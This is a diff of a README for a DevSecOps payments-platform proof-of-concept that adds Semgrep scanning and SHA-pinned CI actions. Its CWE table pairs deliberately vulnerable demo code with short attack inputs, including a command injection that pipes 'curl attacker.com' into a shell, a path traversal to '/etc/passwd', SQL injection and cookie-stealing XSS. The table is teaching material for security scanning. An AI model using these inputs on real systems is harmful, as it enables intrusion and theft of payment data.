@@ -1,6 +1,7 @@
 # payments-platform-poc
 
 [![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/twhalley/payments-platform-poc/badge)](https://scorecard.dev/viewer/?uri=github.com/twhalley/payments-platform-poc)
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 
 Local-first DevSecOps proof-of-concept for a PCI-DSS payments platform: a GitOps-delivered
 Kubernetes workload with autoscaling, layered security scanning, software-supply-chain
@@ -20,7 +21,7 @@ mirroring a GCP/GKE production target.
 | Cloud CI | Google Cloud Build (`cloudbuild.yaml`) |
 | AI-powered scanning | Snyk (DeepCode AI, IaC + containers) |
 | Multi-scanner | Trivy (CVE + secrets + misconfigs) |
-| Static analysis | GitHub CodeQL + Copilot Autofix |
+| Static analysis | GitHub CodeQL (Python) + Semgrep (PHP + Python) + Copilot Autofix |
 | Supply chain integrity | syft SBOM + cosign keyless sign + SLSA provenance + Kyverno admission gate |
 | Autoscaling | HPA — CPU spike demo with k6 load test |
 | Observability | Prometheus + Grafana + Loki (PLG stack — metrics + logs in one pane) |
@@ -63,7 +64,7 @@ The `post-create.sh` script runs automatically and installs:
 
 | Tool | Version | Used by |
 |---|---|---|
-| kind | v0.30.0 | Kubernetes cluster |
+| kind | v0.32.0 | Kubernetes cluster |
 | k6 | v2.0.0 | HPA load test |
 | cosign | v2.2.4 | Supply chain signing |
 | syft | latest | SBOM generation |
@@ -73,6 +74,8 @@ The `post-create.sh` script runs automatically and installs:
 | pre-commit | latest | Installed and active |
 
 kubectl and helm are installed by the devcontainer feature. terraform is also available.
+
+> **Docker in Codespaces:** the DevContainer uses `docker-outside-of-docker` (mounts the Codespace VM's Docker socket) rather than `docker-in-docker`. DinD requires privileged mode which Codespaces prebuilds don't support; DooD works transparently — `kind` creates cluster nodes on the host daemon exactly as it would with DinD.
 
 ### Step 3 — Run the demo
 
@@ -137,7 +140,7 @@ sudo install -m 0755 kubectl /usr/local/bin/kubectl && rm kubectl
 curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
 
 # kind
-curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.30.0/kind-linux-amd64
+curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.32.0/kind-linux-amd64
 sudo install -m 0755 kind /usr/local/bin/kind && rm kind
 
 # k6 — binary install (apt repo GPG key is broken on Debian bookworm)
@@ -218,9 +221,9 @@ the `terraform/gke.tf` approach already provisioned in this repo.
 3. Set up branch protection (see below)
 4. Push a commit to `master` or open a PR — the Actions tab shows the pipeline running
 
-**Every PR runs:** lint → Snyk → CodeQL → Trivy image scan (fails on CRITICAL/HIGH)
+**Every PR runs:** lint → Snyk IaC → CodeQL (Python) → Semgrep (PHP + Python) → Trivy image scan (fails on CRITICAL/HIGH patchable CVEs)
 
-**Every master merge additionally runs:** cosign sign → syft SBOM → SLSA provenance → ArgoCD image-tag bump
+**Every master merge additionally runs:** cosign keyless sign → syft SBOM → SLSA provenance → GitOps bump PR opened on `gitops/bump-{sha}` branch
 
 > *"The pipeline is pinned — `snyk/actions/iac@1.1.2`, `trivy-action@0.24.0` — not `@master`.
 > Mutable refs are a supply chain attack vector: the action could change between runs.
@@ -324,7 +327,8 @@ configuration is auditable from the same source of truth as the code.
 | **Dependabot version updates** | ✅ Enabled | [`.github/dependabot.yml`](.github/dependabot.yml) — weekly PRs for Actions, Docker, pip, Terraform, npm |
 | **Dependabot security updates** | ✅ Enabled | Raises PRs when a dependency has a published CVE — requires human review before merge |
 | **Dependabot auto security fixes** | ❌ Intentionally disabled | Auto-merging security patches without review is not appropriate for a payments platform. All fixes go through the standard PR + CI gate process. |
-| **CodeQL (GHAS)** | ✅ Enabled | `.github/workflows/ci.yaml` — SARIF uploaded to Security tab on every push |
+| **CodeQL (GHAS)** | ✅ Enabled | `.github/workflows/ci.yaml` — Python SAST; SARIF uploaded to Security tab on every push |
+| **Semgrep OSS** | ✅ Enabled | `.github/workflows/ci.yaml` — PHP + Python SAST (`p/php` + `p/python`); SARIF to Security tab |
 | **Secret scanning** | ✅ Enabled | GitHub Push Protection — blocks pushes containing detected secrets |
 | **Private vulnerability reporting** | ✅ Enabled | [`SECURITY.md`](SECURITY.md) — reports via GitHub Security Advisories |
 | **OpenSSF Scorecard** | ✅ Enabled | `.github/workflows/scorecard.yml` — fires on push to master + weekly cron, badge in README |
@@ -559,22 +563,24 @@ and watch ArgoCD detect drift and reconcile within 3 minutes without any manual 
 Open `.github/workflows/ci.yaml` on GitHub and walk through the jobs:
 
 1. **lint** — Kustomize dry-run + `helm lint` before anything builds
-2. **snyk** — AI-powered IaC scan; results appear in the GitHub Security tab
-3. **codeql** — GitHub AI static analysis with Copilot Autofix suggestions on PR diffs
-4. **build-scan** — builds the image, Trivy scans for CVEs/secrets/misconfigs, exits 1 on CRITICAL/HIGH
-5. **sign** — cosign keyless signing via GitHub OIDC + syft SBOM attached as attestation
-6. **deploy** — bumps the image tag in the Kustomize overlay; ArgoCD picks it up automatically
+2. **snyk** — AI-powered IaC scan (Terraform + K8s manifests); results appear in the GitHub Security tab
+3. **codeql** — GitHub AI static analysis for Python with Copilot Autofix suggestions on PR diffs
+4. **semgrep** — OSS SAST for PHP and Python using the `p/php` + `p/python` rulesets; surfaces findings from `demo/insecure-code/vulnerable_payment.php` (CWE-89, CWE-79, CWE-78, CWE-22, CWE-327) in the Security tab. CodeQL does not support PHP natively — Semgrep fills that gap.
+5. **build-scan** — builds the image, Trivy scans for CVEs/secrets/misconfigs, exits 1 on CRITICAL/HIGH (patchable only — `ignore-unfixed: true`)
+6. **sign** — cosign keyless signing via GitHub OIDC (no long-lived keys) + syft SBOM attached as OCI attestation; separate `supply-chain.yaml` workflow adds CycloneDX SBOM and GitHub-native SLSA provenance
+7. **deploy** — opens a PR on a `gitops/bump-{sha}` branch with the new image tag; ArgoCD picks it up after merge. Branch protection prevents `github-actions[bot]` from pushing directly to master — opening a PR is the correct GitOps promotion pattern.
 
 Point at the pinned action versions:
 ```yaml
-uses: snyk/actions/iac@1.1.2         # not @master
-uses: aquasecurity/trivy-action@0.24.0  # not @master
+uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683          # v4.2.2
+uses: azure/setup-helm@dda3372f752e03dde6b3237bc9431cdc2f7a02a2          # v5.0.0
+uses: docker/build-push-action@f9f3042f7e2789586610d6e8b85c8f03e5195baf    # v7.2.0
+uses: github/codeql-action/analyze@8aad20d150bbac5944a9f9d289da16a4b0d87c1e # v4.36.2
 ```
 
-> *"Two AI scanners in parallel — Snyk's DeepCode engine and CodeQL with Copilot Autofix.
-> Running both means I'm not trusting a single vendor. Actions are pinned to specific versions,
-> not @master — a mutable ref is a supply chain attack vector. The developer sees the issue
-> in the PR before it merges — that's what shift-left means in practice."*
+Every action is pinned to its **commit SHA**, not a version tag. A version tag (`@v4`) is a mutable pointer — any repo owner can push new code to it between runs. A commit SHA is immutable: what ran yesterday runs the same way today. This is the Scorecard `Pinned-Dependencies` check, and it's the difference between supply chain hygiene and a supply chain attack surface.
+
+> *"Seven jobs — three parallel scanners in the SAST layer: Snyk for IaC, CodeQL for Python, Semgrep for PHP. Running multiple independent scanners means I'm not trusting a single vendor's rule set or blind spot. All action SHAs are pinned to commits, not tags — a mutable ref is a supply chain attack vector. The developer sees findings as inline PR annotations before the code merges — that's shift-left in practice."*
 
 ---
 
@@ -1129,14 +1135,15 @@ CWEs annotated with the attack scenario and which tool catches it:
 | Function | CWE | Attack scenario | Caught by |
 |---|---|---|---|
 | `$db_password = 'P@ymentDB...'` | CWE-798 | Credential in source / git history | Trivy, gitleaks |
-| `mysql_query("... " . $_GET['id'])` | CWE-89 SQL injection | `1 OR 1=1` dumps all payment rows | CodeQL, Snyk |
-| `echo $_GET['status']` | CWE-79 XSS | `<script>` tag steals session cookie | CodeQL, Snyk, **OWASP ZAP** |
-| `exec("generate_receipt.sh " . $amount)` | CWE-78 Command injection | `100; curl attacker.com \| sh` | CodeQL, Snyk |
-| `include('/templates/' . $_GET['template'])` | CWE-22 Path traversal | `../../etc/passwd` discloses server files | CodeQL, Snyk |
-| `md5($card_number)` | CWE-327 Broken crypto | MD5 collision — PCI-DSS Req 3.4 fail | Snyk DeepCode |
+| `mysql_query("... " . $_GET['id'])` | CWE-89 SQL injection | `1 OR 1=1` dumps all payment rows | **Semgrep** (`p/php`), Snyk |
+| `echo $_GET['status']` | CWE-79 XSS | `<script>` tag steals session cookie | **Semgrep** (`p/php`), Snyk, **OWASP ZAP** |
+| `exec("generate_receipt.sh " . $amount)` | CWE-78 Command injection | `100; curl attacker.com \| sh` | **Semgrep** (`p/php`), Snyk |
+| `include('/templates/' . $_GET['template'])` | CWE-22 Path traversal | `../../etc/passwd` discloses server files | **Semgrep** (`p/php`), Snyk |
+| `md5($card_number)` | CWE-327 Broken crypto | MD5 collision — PCI-DSS Req 3.4 fail | **Semgrep** (`p/php`), Snyk DeepCode |
 
-Note the extra column for PHP — **OWASP ZAP DAST** catches CWE-79 (XSS) in the HTTP
-response at runtime, which static scanners cannot. That's why SAST + DAST are both needed.
+Note two things about the PHP column:
+- **Semgrep** (not CodeQL) is the PHP SAST tool — CodeQL does not support PHP natively. Semgrep's `p/php` OSS ruleset covers all five CWEs and uploads SARIF to the GitHub Security tab via the `semgrep` CI job.
+- **OWASP ZAP DAST** catches CWE-79 (XSS) in the HTTP response at runtime. Static scanners see the vulnerable `echo` statement; ZAP sees the actual malicious HTTP response — that's why SAST + DAST are both required.
 
 Now open the secure versions (`secure_payment.py` / `secure_payment.php`) and walk the fixes:
 
@@ -1157,12 +1164,7 @@ $path = $allowed[$name];  include $path;                       // allowlist, not
 hash_hmac('sha256', $card_number, getenv('CARD_HASH_KEY'));    // HMAC-SHA256
 ```
 
-> *"Same five bug classes, two different languages — this is intentional. The patterns
-> (injection, deserialisation, weak crypto, hardcoded secrets) appear wherever developers
-> stop thinking about data as potentially hostile. SAST is language-aware — CodeQL has
-> separate query suites for Python and PHP — so it catches the same logical flaw expressed
-> differently. The ZAP DAST result for the PHP XSS is the one no static scanner sees:
-> it requires a running application returning a real HTTP response."*
+> *"Same bug classes, two languages — intentional. These are not language-specific mistakes; they appear wherever developers stop treating input as hostile. For Python, CodeQL traces full data flow from function argument to cursor.execute() — fewer false positives than grep-based tools. For PHP, CodeQL has no native support, so Semgrep's p/php ruleset fills the gap — same findings, different engine, all in the same Security tab. The ZAP finding for CWE-79 XSS is the one no static scanner captures: it needs a running application returning a real HTTP response. SAST catches what's in the code; DAST catches what an attacker actually sees."*
 
 | Function | CWE | Attack scenario | Caught by |
 |---|---|---|---|
@@ -1414,7 +1416,7 @@ Every JD requirement maps to specific files in this repo. Open the file directly
 |---|---|---|
 | Production Kubernetes (GKE) | Steps 1–2, 11 | `kind-config.yaml`, `terraform/gke.tf` (private cluster, Workload Identity, Shielded Nodes), `terraform/variables.tf` |
 | Terraform for GCP | Step 11 | `terraform/main.tf` (provider), `terraform/gke.tf` (cluster), `terraform/vpc.tf` (VPC + Cloud Armor), `terraform/kms.tf` (KMS rotation), `terraform/outputs.tf` |
-| CI/CD — GitHub Actions | Step 5 | `.github/workflows/ci.yaml` (lint → snyk → codeql → trivy → sign → deploy), `.github/workflows/dast.yaml` (ZAP), `.github/workflows/supply-chain.yaml` (SLSA provenance) |
+| CI/CD — GitHub Actions | Step 5 | `.github/workflows/ci.yaml` (lint → snyk → codeql → semgrep → trivy → sign → deploy/GitOps PR), `.github/workflows/dast.yaml` (ZAP), `.github/workflows/supply-chain.yaml` (SLSA provenance) |
 | CI/CD — Google Cloud Build | Step 5 | `cloudbuild.yaml` (Trivy pinned to `aquasec/trivy:0.51.0`, not `latest`) |
 | DNS, TLS / mTLS, load balancing | Step 9 | `istio/peer-authentication.yaml` (STRICT mTLS), `istio/authorization-policy.yaml` (deny-all + explicit allow) |
 | Docker / container lifecycle | Steps 2, 16A | `Dockerfile` (hardened build), `k8s/base/deployment.yaml` (securityContext, probes, emptyDir mounts), `demo/vulnerable/Dockerfile` (negative comparison) |
@@ -1433,7 +1435,7 @@ Every JD requirement maps to specific files in this repo. Open the file directly
 | DAST | Step 14 | `.github/workflows/dast.yaml`, `.zap/rules.tsv` (rule overrides with rationale) |
 | Automated dependency updates | — | `.github/dependabot.yml` (weekly PRs: Actions + Docker + pip + Terraform + npm) |
 | Vulnerability disclosure | — | `SECURITY.md` (private disclosure via GitHub Security Advisories) |
-| SAST — dangerous functions (Python + PHP) | Steps 5, 16G | `demo/insecure-code/vulnerable_payment.py` + `vulnerable_payment.php` (CWE-89/78/79/22/327/502/798), `demo/insecure-code/secure_payment.py` + `secure_payment.php` (remediations) |
+| SAST — dangerous functions (Python + PHP) | Steps 5, 16G | CodeQL → Python findings; Semgrep `p/php` → PHP findings; both upload SARIF to Security tab. `demo/insecure-code/vulnerable_payment.py` + `vulnerable_payment.php` (CWE-89/78/79/22/327/502/798), secure counterparts show remediations |
 | Secret detection — three-layer defence | Step 16F | `.pre-commit-config.yaml` (gitleaks Layer 0), GitHub Push Protection (Layer 1, demonstrated live), `make security-scan` Trivy FS (Layer 2) |
 | Policy unit testing | Step 16H | `kyverno/tests/unit-test.yaml`, `kyverno/tests/resources.yaml`, `make kyverno-test` |
 | RBAC least-privilege audit | — | `k8s/rbac/rbac.yaml`, `make rbac-audit` (`kubectl auth can-i` for each service account) |
@@ -1458,7 +1460,7 @@ The shift-left model has five stages. All five are covered end-to-end:
 
 | Stage | Controls |
 |---|---|
-| **Code** | CodeQL SAST + Copilot Autofix suggestions on PR diffs; Snyk DeepCode AI; signed commits (GPG Ed25519) |
+| **Code** | CodeQL SAST (Python) + Copilot Autofix suggestions on PR diffs; Semgrep OSS (PHP + Python); Snyk DeepCode AI; signed commits (GPG Ed25519) |
 | **Build** | Trivy (CVE + secrets + misconfigs); Snyk IaC scan; container build hardened from `nginx-unprivileged` |
 | **Package** | cosign keyless signing (GitHub OIDC, no long-lived keys); syft SBOM (SPDX + CycloneDX) as OCI attestation; SLSA provenance |
 | **Deploy** | ArgoCD GitOps (audit trail, selfHeal); Kyverno + PSS two-gate admission; Kyverno verifyImages blocks unsigned images; RBAC |
@@ -1655,7 +1657,7 @@ This PoC demonstrates the same pattern:
 | GitOps (ArgoCD) | `argocd/application.yaml` — prune + selfHeal |
 | GitHub Actions CI/CD | `.github/workflows/ci.yaml`, `dast.yaml`, `supply-chain.yaml` |
 | Google Cloud Build | `cloudbuild.yaml` |
-| SAST | CodeQL + Snyk DeepCode, Python + PHP demo code |
+| SAST | CodeQL (Python) + Semgrep (PHP + Python, `p/php` + `p/python` rulesets) + Snyk DeepCode; all findings in GitHub Security tab |
 | SCA | Snyk + Trivy (CVE + licence scanning) |
 | DAST | OWASP ZAP (`.github/workflows/dast.yaml`, `.zap/rules.tsv`) |
 | IaC scanning | Trivy misconfig + Snyk IaC (Terraform + K8s manifests) |
@@ -1704,7 +1706,7 @@ Most interview PoCs show one or two of these. This one shows all of them:
 2. **Two independent admission gates** — PSS at the API server (no webhook) and Kyverno (admission webhook) — one misconfiguration doesn't mean a policy bypass
 3. **Policy unit tests** — Kyverno policies are tested before deployment, same as application code
 4. **Runtime detection** — Falco eBPF catches behaviour that admission policies cannot (post-compromise activity inside a running container)
-5. **SAST in two languages** — Python and PHP vulnerability demos with CWE annotations, showing the same bug classes in different runtimes
+5. **SAST across two languages with three scanners** — CodeQL (Python), Semgrep (PHP + Python), and Snyk run in parallel. PHP findings from `vulnerable_payment.php` appear in the GitHub Security tab via Semgrep since CodeQL does not support PHP. Same CWE classes, different runtimes — demonstrates that these are architectural patterns, not language-specific bugs.
 6. **Three-layer secret defence** — pre-commit hook → GitHub Push Protection → Trivy CI scan (demonstrated live during development)
 7. **Proper secrets management** — ESO + OpenBao locally with identical ExternalSecret manifests swapped for GCP Secret Manager in production via Workload Identity; only the ClusterSecretStore changes
 8. **CIS Benchmark + OpenSSF Scorecard** — compliance checks that most PoCs skip entirely: kube-bench validates control-plane hardening; Scorecard evaluates 18 supply-chain health dimensions with a public badge
